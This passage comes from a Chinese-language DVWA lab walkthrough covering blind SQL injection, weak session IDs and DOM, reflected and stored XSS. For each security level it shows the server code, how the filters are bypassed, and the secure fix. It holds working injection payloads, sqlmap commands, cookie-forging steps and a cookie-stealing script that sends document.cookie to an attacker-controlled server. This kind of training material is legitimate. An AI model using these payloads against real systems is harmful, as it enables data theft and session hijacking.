		重复上述步骤,就可以猜解出完整的数据库名(dvwa)了.

	3. 猜解数据库中的表名

		首先猜解数据库中表的数量:
		```
    	1' and (select count(table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在

    	1' and (select count(table_name) from information_schema.tables where table_schema=database())=2 # 显示存在
		```
		说明数据库中共有两个表

		接着挨个猜解表名:
		```
		1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #

		1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在

		…

		1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在
		```
		说明第一个表名长度为9.

		```
		1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97 # 显示存在

		1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<122 # 显示存在

		1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<109 # 显示存在

		1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<103 # 显示不存在

		1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>103 # 显示不存在
		```
		说明第一个表的名字的第一个字符为小写字母g.

		重复上述步骤,即可猜解出两个表名(guestbook、users).

	4. 猜解表中的字段名

		首先猜解表中字段的数量:
		```
		1' and (select count(column_name) from information_schema.columns where table_name= 'users')=1 # 显示不存在

		…

		1' and (select count(column_name) from information_schema.columns where table_name= 'users')=8 # 显示存在
		```
		说明 users 表有 8 个字段.

		接着挨个猜解字段名:
		```
	    1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=1 # 显示不存在

    	…

	    1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=7 # 显示存在
		```
		说明users表的第一个字段为7个字符长度.

		采用二分法,即可猜解出所有字段名.

	5. 猜解数据

		同样采用二分法.
		还可以使用基于时间的盲注:

		1. 判断是否存在注入,注入是字符型还是数字型

    		输入 `1' and sleep(2) #` ,感觉到明显延迟;

    		输入 `1 and sleep(2) #` ,没有延迟;

			说明存在字符型的基于时间的盲注.

		2. 猜解当前数据库名

			首先猜解数据名的长度:
			```
			1' and if(length(database())=1,sleep(2),1) # 没有延迟
			1' and if(length(database())=2,sleep(2),1) # 没有延迟
			1' and if(length(database())=3,sleep(2),1) # 没有延迟
			1' and if(length(database())=4,sleep(2),1) # 明显延迟
			```
			说明数据库名长度为4个字符.

			接着采用二分法猜解数据库名:
			```
			1' and if(ascii(substr(database(),1,1))>97,sleep(2),1)# 明显延迟
			…
			1' and if(ascii(substr(database(),1,1))<100,sleep(2),1)# 没有延迟
			1' and if(ascii(substr(database(),1,1))>100,sleep(2),1)# 没有延迟
			说明数据库名的第一个字符为小写字母d.
    		…
			```
			重复上述步骤,即可猜解出数据库名.

		3. 猜解数据库中的表名

			首先猜解数据库中表的数量:
			```
			1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(2),1)# 没有延迟

    		1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(2),1)# 明显延迟
			```

			说明数据库中有两个表.接着挨个猜解表名:
			```
		    1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(2),1) # 没有延迟
    		…
		    1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(2),1) # 明显延迟
			```
			说明第一个表名的长度为9个字符.
			采用二分法即可猜解出表名.

		4. 猜解表中的字段名

			首先猜解表中字段的数量:
			```
		    1' and if((select count(column_name) from information_schema.columns where table_name= 'users')=1,sleep(2),1)# 没有延迟
    		…
		    1' and if((select count(column_name) from information_schema.columns where table_name= 'users')=8,sleep(2),1)# 明显延迟
			```
			说明users表中有8个字段.接着挨个猜解字段名
			```
		    1' and if(length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=1,sleep(2),1) # 没有延迟
    		…
		    1' and if(length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=7,sleep(2),1) # 明显延迟
			```
			说明users表的第一个字段长度为7个字符.
			采用二分法即可猜解出各个字段名.

		5. 猜解数据

			同样采用二分法.

**sqlmap**

`sqlmap -u "http://<IP地址!!!>/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=<自己的sessionID!!!>"`

### Medium

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $id = $_POST[ 'id' ];
    $id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    //mysql_close();
}

?>
```

可以看到,Medium 级别的代码利用 mysql_real_escape_string 函数对特殊符号 ` \x00,\n,\r,\,’,",\x1a` 进行转义,同时前端页面设置了下拉选择表单,希望以此来控制用户的输入.

**漏洞利用**

虽然前端使用了下拉选择菜单,但我们依然可以通过抓包改参数id,提交恶意构造的查询参数.

之前已经介绍了详细的盲注流程,这里就简要演示几个.

- **首先是基于布尔的盲注**

	抓包改参数 id 为 `1 and length(database())=4 #` ,显示存在,说明数据库名的长度为4个字符;

	抓包改参数 id 为 `1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #` ,显示存在,说明数据中的第一个表名长度为9个字符;

	抓包改参数 id 为 `1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #` ,(0×7573657273为users的16进制),显示存在,说明uers表有8个字段.

- **然后是基于时间的盲注**

	抓包改参数 id 为 `1 and if(length(database())=4,sleep(5),1) #` ,明显延迟,说明数据库名的长度为4个字符;

	抓包改参数 id 为 `1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #` ,明显延迟,说明数据中的第一个表名长度为9个字符;

	抓包改参数 id 为 `1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #` ,明显延迟,说明uers表有8个字段.

**sqlmap**

抓包,把数据存到 1.txt

`sqlmap -r 1.txt`

```
-r 请求文件 从 HTTP 请求文件中加载
```

### High

**服务器端核心代码**
```php
<?php

if( isset( $_COOKIE[ 'id' ] ) ) {
    // Get input
    $id = $_COOKIE[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Might sleep a random amount
        if( rand( 0, 5 ) == 3 ) {
            sleep( rand( 2, 4 ) );
        }

        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```
可以看到,High 级别的代码利用 cookie 传递参数 id,当 SQL 查询结果为空时,会执行函数 sleep(seconds),目的是为了扰乱基于时间的盲注.同时在 SQL 查询语句中添加了 LIMIT 1,希望以此控制只输出一个结果.

**漏洞利用**

虽然添加了 LIMIT 1,但是我们可以通过 # 将其注释掉.但由于服务器端执行 sleep 函数,会使得基于时间盲注的准确性受到影响,这里我们只演示基于布尔的盲注:

抓包将 cookie 中参数 id 改为 `1' and length(database())=4 #`,显示存在,说明数据库名的长度为4个字符;

抓包将 cookie 中参数 id 改为 `1' and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #` ,显示存在,说明数据中的第一个表名长度为9个字符;

抓包将 cookie 中参数 id 改为 `1' and (select count(column_name) from information_schema.columns where table_name=0x7573657273)=8 #` ,(0×7573657273 为users的16进制),显示存在,说明uers表有8个字段.

### Impossible

**服务器端核心代码**
```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();

        // Get results
        if( $data->rowCount() == 1 ) {
            // Feedback for end user
            echo '<pre>User ID exists in the database.</pre>';
        }
        else {
            // User wasn't found, so the page wasn't!
            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

            // Feedback for end user
            echo '<pre>User ID is MISSING from the database.</pre>';
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```
可以看到,Impossible 级别的代码采用了 PDO 技术,划清了代码与数据的界限,有效防御 SQL 注入,Anti-CSRF token 机制的加入了进一步提高了安全性.

---

## Weak_Session_IDs

密码与证书等认证手段,一般仅仅用于登录(Login)的过程.当登陆完成后,用户访问网站的页面,不可能每次浏览器请求页面时,都再使用密码认证一次.因此,当认证完成后,就需要替换一个对用户透明的凭证.这个凭证就是 SessionID.

当用户登陆完成后,在服务器端就会创建一个新的会话(Session),会话中会保存用户的状态和相关信息.服务器端维护所有在线用户的 Session,此时的认证,只需要知道是哪个用户在浏览当前的页面即可.为了告诉服务器应该使用哪一个 Session,浏览器需要把当前用户持有的 SessionID 告知服务器.最常见的做法就是把 SessionID 加密后保存在 Cookie 中,因为 Cookie 会随着 HTTP 请求头发送,且受到浏览器同源策略的保护.

SessionID 一旦在生命周期内被窃取,就等同于账户失窃.同时由于 SessionID 是用户登录之后才持有的认证凭证,因此黑客不需要再攻击登陆过程(比如密码).Session 劫持就是一种通过窃取用户 SessionID 后,使用该 SessionID 登录进目标账户的攻击方法,此时攻击者实际上是使用了目标账户的有效 Session.如果 SessionID 是保存在 Cookie 中的,则这种攻击可以称为 Cookie 劫持.SessionID 还可以保存在 URL 中,作为一个请求的一个参数,但是这种方式的安全性难以经受考验.

因此,在生成 SessionID 时,需要保证足够的随机性,比如采用足够强的伪随机数生成算法.

**SessionID 利用的实质**

SessionID 是在登录后,作为特定用户访问站点所需的唯一内容.如果能够计算或轻易猜到该 SessionID,则攻击者将可以轻易获取访问权限,无需登录密码直接进入特定用户界面,进而查找其他漏洞如 XSS、文件上传等等.

此模块使用四种不同的方式来设置 dvwaSession 的 cookie 值,每个级别的目标是计算 ID 的生成方式,然后推断其他管理员用户的 ID.

### Low

**服务器端核心代码**
```php
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id'])) {
        $_SESSION['last_session_id'] = 0;
    }
    $_SESSION['last_session_id']++;
    $cookie_value = $_SESSION['last_session_id'];
    setcookie("dvwaSession", $cookie_value);
}
?>
```
可以看出,dvwaSession 是从 0 开始的,每次加 1.

**漏洞利用**

模拟管理员登录,在浏览器 1 里,点击 Generate,Burpsuite 抓包,发送到 Repeater,go 一次

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa58.png)

请求头中:
> Cookie: dvwaSession=17; security=low; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2

响应头中:
> Set-Cookie: dvwaSession=18

多 go 几次,发现 dvwaSession 一直增加,每次加 1.
恶意攻击者通过寻找到上述规律,使用浏览器 2,成功构造出 payload:
> Cookie: dvwaSession=18; security=low; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2

`注:这里的 cookie 值要根据你自己的 dvwaSession 去计算`

在无密码认证的情况下,成功登陆到界面:
`http://<IP地址!!!>/vulnerabilities/weak_id/`

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa59.png)

### Medium

**服务器端核心代码**
```php
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $cookie_value = time();
    setcookie("dvwaSession", $cookie_value);
}
?>
```
由代码可知,cookie 的值由时间而得

**漏洞利用**

模拟管理员登录,在浏览器 1 里,点击 Generate,burp 里发现:

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa60.png)

请求头中:
> Cookie: dvwaSession=19; security=medium; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2

响应头中:
> Set-Cookie: dvwaSession=1561346895

多 go 几次,发现 dvwaSession 和时间戳变化一致.在此,建议自行搜索 `unix时间戳`

恶意攻击者通过寻找到上述规律,使用浏览器 2,成功构造出 payload:
> Cookie: dvwaSession=1561347450; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2; security=medium

`注:这里的 cookie 值要根据你自己的当前时间去算出来`

在无密码认证的情况下,成功登陆到界面:
`http://<IP地址!!!>/vulnerabilities/weak_id/`

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa61.png)

### High

**服务器端核心代码**
```php
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id_high'])) {
        $_SESSION['last_session_id_high'] = 0;
    }
    $_SESSION['last_session_id_high']++;
    $cookie_value = md5($_SESSION['last_session_id_high']);
    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], false, false);
}

?>
```

- **PHP setcookie()函数**

	`setcookie(name,value,expire,path,domain,secure,httponly)`

	| 参数     | 描述                                       |
	| :------- | :---------------------------------------- |
	| name     | 必需.规定cookie的名称.                     |
	| value    | 必需.规定cookie的值.                      |
	| expire   | 可选.规定cookie的有效期.                   |
	| path     | 可选.规定cookie的服务器路径.                |
	| domain   | 可选.规定cookie的域名.                     |
	| secure   | 可选.规定是否通过安全的HTTPS连接来传输cookie. |
	| httponly | 可选.规定是否Cookie仅可通过HTTP协议访问.     |

	由源码可知:
	```
	value 值:last_session_id_high 自增 1,再用 md5 加密
	expire 值:当前时间再加一个小时
	path 值:/vulnerabilities/weak_id/
	```

**漏洞利用**

模拟管理员登录,在浏览器 1 里,点击 Generate,burp 里发现:

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa62.png)

请求头中:
> Cookie: dvwaSession=19; security=high; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2

响应头中:
> Set-Cookie: dvwaSession=c4ca4238a0b923820dcc509a6f75849b; expires=Mon, 24-Jun-2019 04:56:58 GMT;

多 go 几次,发现 dvwaSession 值通过 MD5 加密.将每次产生的 MD5 解密,发现解密后的值,发现和低等级中的代码一样,是从 0 开始加的.

恶意攻击者通过寻找到上述规律,使用浏览器 2,成功构造出 payload:
> Cookie: dvwaSession=1F0E3DAD99908345F7439F8FFABDFFC4; security=high; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2

`注:这里的 cookie 值要根据你自己的 dvwaSession 去计算 md5`

`http://<IP地址!!!>/vulnerabilities/weak_id/`

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa63.png)

### Impossible

**服务器端核心代码**
```php
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $cookie_value = sha1(mt_rand() . time() . "Impossible");
    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], true, true);
}
?>
```
$cookie_value 采用随机数+时间戳+固定字符串"Impossible",再进行 sha1 运算,完全不能猜测到 dvwaSession 的值.实现了用户安全会话认证.

---

## XSS

XSS,全称 Cross Site Scripting,即跨站脚本攻击,某种意义上也是一种注入攻击,是指攻击者在页面中注入恶意的脚本代码,当受害者访问该页面时,恶意代码会在其浏览器上执行,需要强调的是,XSS 不仅仅限于 JavaScript,还包括 flash等其它脚本语言.根据恶意代码是否存储在服务器中,XSS 可以分为存储型的XSS与反射型的XSS.

DOM型的XSS由于其特殊性,常常被分为第三种,这是一种基于DOM树的XSS.例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面,如果这些函数在引用某些变量时没有进行过滤或检查,就会产生DOM型的XSS.DOM型XSS可能是存储型,也有可能是反射型.

### XSS(DOM)

DOM,全称 Document Object Model,是一个平台和语言都中立的接口,可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式.

DOM 型 XSS 其实是一种特殊类型的反射型 XSS,它是基于 DOM 文档对象模型的一种漏洞.

在网站页面中有许多页面的元素,当页面到达浏览器时浏览器会为页面创建一个顶级的 Document object 文档对象,接着生成各个子文档对象,每个页面元素对应一个文档对象,每个文档对象包含属性、方法和事件.可以通过 JS 脚本对文档对象进行编辑从而修改页面的元素.也就是说,客户端的脚本程序可以通过 DOM 来动态修改页面内容,从客户端获取 DOM 中的数据并在本地执行.基于这个特性,就可以利用 JS 脚本来实现 XSS 漏洞的利用.

可能触发 DOM 型 XSS 的属性
```
document.referer 属性
window.name 属性
location 属性
innerHTML 属性
documen.write 属性
```

#### Low

**服务器端核心代码**
```php
<?php

# No protections, anything goes

?>
```
简单直接,都告诉你了没有任何保护

**漏洞利用**

`http://<IP地址!!!>/vulnerabilities/xss_d/?default=English<script>alert(/xss/);</script>`

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa64.png)

#### Medium

**服务器端核心代码**
```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];

    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?>
```

**相关函数介绍**

array_key_exists() 函数检查某个数组中是否存在指定的键名,如果键名存在则返回 true,如果键名不存在则返回 false.

stripos() 函数查找字符串在另一字符串中第一次出现的位置

**漏洞利用**

这里就不用 `<script>` 换一种方法

`http://<IP地址!!!>/vulnerabilities/xss_d/?default=English<input onfocus="alert('xss');" autofocus>`

#### High

**服务器端核心代码**
```php
<?php
// Is there any input?
if (array_key_exists("default", $_GET) && !is_null($_GET['default'])) {
    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header("location: ?default=English");
            exit;
    }
}
```

这里采用了白名单,然而并没有什么鸟用

**漏洞利用**

`http://<IP地址!!!>/vulnerabilities/xss_d/?default=English #<script>alert(/xss/)</script>`

#### Impossible

**服务器端核心代码**
```php
<?php

# Don't need to do anything, protction handled on the client side

?>
```

---

### XSS(Reflected)

反射型 XSS,非持久化,需要欺骗用户自己去点击带有特定参数的 XSS 代码链接才能触发引起(服务器中没有这样的页面和内容),一般容易出现在搜索页面.

#### Low

**服务器端核心代码**
```php
<?php
header("X-XSS-Protection: 0");
// Is there any input?
if (array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET['name'] . '</pre>';
}
```

可以看到,代码直接采用 get 方式传入了 name 参数,并没有任何的过滤与检查,存在明显的 XSS 漏洞.

**漏洞利用**

`<script>alert(/xss/)</script>` ,成功弹框:

相应的XSS链接

`http://<IP地址!!!>/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#`

**实战利用盗取用户 cookies 进入后台**

攻击者自己网站 http://<服务器B>/xss/ 里构造

hacker.js
```js
var img = new Image();
img.src="http://<服务器B>/xss/hacker.php?x=" + document.cookie;
document.body.append(img);
```

hacker.php
```php
<?php
$cookie = $_GET['x'];
file_put_contents('cookie.txt', $cookie);
?>
```

于是插入 dvwa 的 xss payload 为 `<script src="http://<服务器B>/xss/hacker.js" /></script>`

XSS 利用,得到 cookies

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa81.png)

#### Medium

**服务器端核心代码**
```php
<?php
header("X-XSS-Protection: 0");
// Is there any input?
if (array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
    // Get input
    $name = str_replace('<script>', '', $_GET['name']);
    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}
```
可以看到,这里对输入进行了过滤,基于黑名单的思想,使用 str_replace 函数将输入中的 `<script>` 删除,这种防护机制是可以被轻松绕过的.

**漏洞利用**
1. 双写绕过

输入`<sc<script>ript>alert(/xss/)</script>`,成功弹框:

相应的 XSS 链接:
`http://<IP地址!!!>/dvwa/vulnerabilities/xss_r/?name=%3Csc%3Cscript%3Eript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#`

2. 大小写混淆绕过

输入`<ScRipt>alert(/xss/)</script>`,成功弹框:

相应的 XSS 链接:
`http://<IP地址!!!>/dvwa/vulnerabilities/xss_r/?name=%3CScRipt%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#`

#### High

**服务器端核心代码**
```php
<?php
header("X-XSS-Protection: 0");
// Is there any input?
if (array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
    // Get input
    $name = preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['name']);
    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}
```
可以看到,High 级别的代码同样使用黑名单过滤输入,preg_replace() 函数用于正则表达式的搜索和替换,这使得双写绕过、大小写混淆绕过(正则表达式中 i 表示不区分大小写)不再有效.

**漏洞利用**

虽然无法使用 `<script>` 标签注入 XSS 代码,但是可以通过 img、body 等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码.

输入 `<img src=1 onerror=alert(/xss/)>` 或 `<input onfocus="alert('xss');" autofocus>` ,成功弹框

#### Impossible

**服务器端核心代码**
```php
<?php
// Is there any input?
if (array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
    // Check Anti-CSRF token
    checkToken($_REQUEST['user_token'], $_SESSION['session_token'], 'index.php');
    // Get input
    $name = htmlspecialchars($_GET['name']);
    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}
// Generate Anti-CSRF token
generateSessionToken();
```
可以看到,Impossible 级别的代码使用 htmlspecialchars 函数把预定义的字符 &、"、 '、<、> 转换为 HTML 实体,防止浏览器将其作为 HTML 元素.

---

### XSS(Stored)
#### Low

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```
可以看到,对输入并没有做 XSS 方面的过滤与检查,且存储在数据库中,因此这里存在明显的存储型 XSS 漏洞.

**相关函数介绍**

- **trim(string,charlist)**

	移除字符串两侧的空白字符或其他预定义字符,预定义字符包括 `、\t、\n、\x0B、\r` 以及空格,可选参数 charlist 支持添加额外需要删除的字符.

- **mysql_real_escape_string(string,connection)**

	函数会对字符串中的特殊符号 `\x00,\n,\r,\,‘,",\x1a` 进行转义.

- **stripslashes(string)**

	函数删除字符串中的反斜杠.

**漏洞利用**

name 一栏前端有字数限制,可以直接修改前端代码,也可以抓包修改

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa65.png)

message 一栏输入 `<script>alert(/xss/)</script>` ,成功弹框

#### Medium

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

**相关函数介绍**

strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签,但允许使用 `<b>` 标签.

addslashes() 函数返回在预定义字符(单引号、双引号、反斜杠、NULL)之前添加反斜杠的字符串.

可以看到,由于对 message 参数使用了 htmlspecialchars 函数进行编码,因此无法再通过 message 参数注入 XSS 代码,但是对于 name 参数,只是简单过滤了 `<script>` 字符串,仍然存在存储型的XSS.

**漏洞利用**

1. 双写绕过

	直接修改前端代码改 name 参数为 `<sc<script>ript>alert(/xss/)</script>` ,成功弹框

2. 大小写混淆绕过

	直接修改前端代码改 name 参数为 `<Script>alert(/xss/)</script>` ,成功弹框

#### High

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

可以看到,这里使用正则表达式过滤了 `<script>` 标签,但是却忽略了 img、iframe 等其它危险的标签,因此 name 参数依旧存在存储型 XSS.

**漏洞利用**

直接修改前端代码改 name 参数为 `<img src=1 onerror=alert(/xss/)>` ,成功弹框

#### Impossible

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = stripslashes( $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $name = htmlspecialchars( $name );

    // Update database
    $data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' );
    $data->bindParam( ':message', $message, PDO::PARAM_STR );
    $data->bindParam( ':name', $name, PDO::PARAM_STR );
    $data->execute();
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

